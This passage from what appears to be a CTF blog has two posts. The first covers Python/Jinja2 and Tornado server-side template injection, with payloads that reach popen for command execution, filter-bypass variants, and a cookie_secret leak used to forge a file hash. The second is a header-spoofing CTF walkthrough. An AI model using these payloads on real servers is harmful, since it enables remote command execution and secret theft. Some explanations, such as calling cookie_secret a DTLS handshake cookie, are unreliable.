-<h3 id="用户输入恶意信息的格式："><a href="#用户输入恶意信息的格式：" class="headerlink" title="用户输入恶意信息的格式："></a>用户输入恶意信息的格式：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;.......&#125;&#125;装载一个变量</span><br><span class="line"></span><br><span class="line">&#123;%......%&#125;装载一个控制语句</span><br><span class="line"></span><br><span class="line">&#123;#.......#&#125;渲染时，注释中间的内容</span><br></pre></td></tr></table></figure>
-
-<h2 id="对ssti模板中类的调用"><a href="#对ssti模板中类的调用" class="headerlink" title="对ssti模板中类的调用"></a>对ssti模板中类的调用</h2><p>用空格来知道并调用我们需要的类</p>
-<p>查找模板中的类</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27; &#x27;._ _class_ _&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>查找模板类中的基类，一般为object类，有时不止一个基类，可以使用mro来显示所有基类，bases也可以显示所有基类</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27; &#x27;._ _class_ _._ _bases_ _&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#x27; &#x27;._ _class_ _._ _mro_ _&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>查找模板类中的基类的子类的集合，[0]是所有基类中的第一个基类</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27; &#x27;._ _class_ _._ _bases_ _[0]._ _subclasse_ _&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>查找模板类中的基类的子类的初始类，并用globals全局来查找所有的方法及变量及参数，()[118]是在模板类中的基类的第119个子类，<a href="'dir'">‘popen’</a>是调用模板类中的基类的第119个子类的初始类的function popen中的dir来打开文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27; &#x27;._ _class_ _._ _bases_ _[0]._ _subclasse_ _()[118]._ _init_ _._ _globals_ _[&#x27;popen&#x27;](&#x27;dir&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>实例</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5000/test?&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[118].__init__.__globals__[&#x27;popen&#x27;](&#x27;dir&#x27;).read()&#125;&#125;  //打开文件并读取</span><br></pre></td></tr></table></figure>
-
-<h2 id="模板注入可能有些过滤的绕过方法"><a href="#模板注入可能有些过滤的绕过方法" class="headerlink" title="模板注入可能有些过滤的绕过方法"></a>模板注入可能有些过滤的绕过方法</h2><h3 id="绕过-过滤"><a href="#绕过-过滤" class="headerlink" title="绕过[]过滤"></a>绕过[]过滤</h3><p>使用gititem绕过。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">原poc &#123;&#123;&quot;&quot;.class.bases[0]&#125;&#125;</span><br><span class="line"></span><br><span class="line">绕过后&#123;&#123;&quot;&quot;.class.bases.getitem(0)&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="过滤了subclasses，拼凑法"><a href="#过滤了subclasses，拼凑法" class="headerlink" title="过滤了subclasses，拼凑法"></a>过滤了subclasses，拼凑法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">原poc&#123;&#123;&quot;&quot;.class.bases[0].subclasses()&#125;&#125;</span><br><span class="line"></span><br><span class="line">绕过 &#123;&#123;&quot;&quot;.class.bases[0]&#x27;subcla&#x27;+&#x27;sses&#x27;&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="过滤了class"><a href="#过滤了class" class="headerlink" title="过滤了class"></a>过滤了class</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;session[&#x27;__cla&#x27;+&#x27;ss__&#x27;].__mro__[12]&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&#123;request[&#x27;__cl&#x27;+&#x27;ass__&#x27;].__mro__[12]&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="tornado模板注入"><a href="#tornado模板注入" class="headerlink" title="tornado模板注入"></a>tornado模板注入</h2><p>tornado模板注入和以上ssti模板注入类似，不过tornado模板中，存在一些可以快速访问的对象，例如：handler.settings(环境变量)</p>
-<p>而cookie_secret就在handler.settings中</p>
-<h2 id="cookie-secret"><a href="#cookie-secret" class="headerlink" title="cookie_secret"></a>cookie_secret</h2><p>是在DTLS握手过程中的生成和需要验证的cookie值</p>
-<p>DTLS协议是对广播发送UDP报文的加密，且可以防止中断攻击，以为在建立握手时，客户端会发送client-hello请求，此时服务器会生成一个cookie值放在Hello-Verify-Request报文中，<br>此时客户端收到后需将收到的cookie值放到client-hello中，并再发送给服务器，服务器收到后对比cookie值，相同才分配资源。</p>
-<h2 id="实例（tornado模板注入）"><a href="#实例（tornado模板注入）" class="headerlink" title="实例（tornado模板注入）"></a>实例（tornado模板注入）</h2><p>打开网页后看到三个文件，分别时flag.txt、welcome.txt和hint.txt，各自打开文件，发现payload有filename&amp;filehash的get的提交方式，有此可知，需要这两个变量都满足变量才能显示文件的内容</p>
-<p>而打开三个文件后发现flag在/flllllllllllag文件下，且有render渲染函数，且知道了filehash的加密方式</p>
-<p>此时需要我们找到cookie_secret值，此时我们在filename中输入flllllllllllag，发现报错，且payload为/error?msg=error，因此我们可以使用tornado模板中，存在一些可以快速访问的对象的特性，来构造payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error?msg=&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>此时我们得到cookie_secret的值</p>
-<p>然后我们构造exp</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo md5(&#x27;f03d04f0-456b-4577-b431-bd29fd3292d2&#x27;.md5(&quot;/fllllllllllllag&quot;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>得出fliehash值后代入即可得到flag</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" rel="tag">模板注入</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-[极客大挑战 2019]Http(http头部）" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/07/17/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DHttp(http%E5%A4%B4%E9%83%A8%EF%BC%89/" class="article-date">
-  	<time datetime="2021-07-16T16:00:00.000Z" itemprop="datePublished">2021-07-17</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/17/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DHttp(http%E5%A4%B4%E9%83%A8%EF%BC%89/">
-        Http(http头部）
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="http头部"><a href="#http头部" class="headerlink" title="http头部"></a>http头部</h1><h2 id="referer"><a href="#referer" class="headerlink" title="referer"></a>referer</h2><p>是header的一部分，是浏览器告诉服务器网页的从哪里来的</p>
-<h2 id="X-Forward-For"><a href="#X-Forward-For" class="headerlink" title="X-Forward-For"></a>X-Forward-For</h2><p>是一个http的扩展头部，用来记录离服务器最远的源ip和中间的代理ip</p>
-<h2 id="user-agent"><a href="#user-agent" class="headerlink" title="user-agent"></a>user-agent</h2><p>是用户代理，识别用户使用的操作系统及版本、cpu类型、浏览器及版本、浏览器渲染引擎、浏览器语言、浏览器插件</p>
-<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>通过查看页面源代码可以发现一个文件Secret.php，然后构造payload</p>
-<p>/Secret.php</p>
-<p>可以得到<br><img src="https://github.com/xiaocheng10/xiaocheng10.github.io/blob/master/image/http1.webp" alt="http1"></p>
-<p>因此，我们将referer改为<a target="_blank" rel="noopener" href="https://www.sycsecret.com/">https://www.Sycsecret.com</a><br>然后我们得到<br><img src="https://github.com/xiaocheng10/xiaocheng10.github.io/blob/master/image/http2.webp" alt="http2"></p>
-<p>我们再将User-Agent里将火狐改为Syclover<br>我们得到<br><img src="https://github.com/xiaocheng10/xiaocheng10.github.io/blob/master/image/http3.webp" alt="http3"></p>
-<p>然后我们在报文结尾加上X-Forward-For: 127.0.0.1<br><img src="https://github.com/xiaocheng10/xiaocheng10.github.io/blob/master/image/http4.webp" alt="http4"></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/http/" rel="tag">http</a></li></ul>
 	</div>
 
       
